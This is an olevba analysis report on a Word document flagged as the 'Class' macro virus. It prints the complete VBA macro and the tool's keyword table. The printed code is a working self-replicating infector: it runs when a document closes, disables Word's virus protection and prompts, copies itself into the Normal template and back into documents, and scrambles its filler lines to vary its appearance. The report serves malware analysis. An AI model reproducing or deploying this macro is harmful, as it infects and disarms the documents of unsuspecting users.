olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.cs-0a1b231223717973fa16557af6a7b2661c54f0dc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.cs-0a1b231223717973fa16557af6a7b2661c54f0dc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
IGQ = FPN + EVR
On Error Resume Next
OBK = COR + KAL
Application.EnableCancelKey = 0
NSG = GNI + LOO
KC7 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
DPU = QUD + GPF
Options.SaveNormalPrompt = 0
UUS = TEU + CRQ
VR71 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
UKT = DKI + NAH
Options.VirusProtection = 0
QBF = BSE + RVR
Options.ConfirmConversions = 0
KPG = BHF + JHO
If KC7 > 0 And VR71 > 0 Then GoTo LE96
JSK = JNO + VAM
If KC7 = 0 Then
BND = KJV + NQG
Set VL56 = ActiveDocument.VBProject.VBComponents.Item(1)
TSH = TLE + TKV
SF81 = True
AVS = GEJ + PGV
End If
EOB = TBK + KCC
If VR71 = 0 Then
IBV = VMA + NQI
Set VL56 = NormalTemplate.VBProject.VBComponents.Item(1)
MDO = ENS + MVI
UL53 = True
NDQ = PTS + OFJ
End If
NBC = UFT + MET
If UL53 <> True And SF81 <> True Then GoTo LE96
EGB = JHN + IUQ
If UL53 = True Then VL56.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, KC7 - 1))
BHI = MFU + JGU
If SF81 = True Then VL56.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, VR71 - 1))
PUK = HRB + CPE
With VL56.CodeModule
IQE = HGK + VOS
For x = 2 To (VL56.CodeModule.CountOfLines - 1) Step 2
KHT = NHM + ATJ
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
MDE = NBV + UTS
Next x
UIS = IJS + SNJ
End With
DOC = AGM + HOM
LE96:
GEJ = JIV + HHV
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

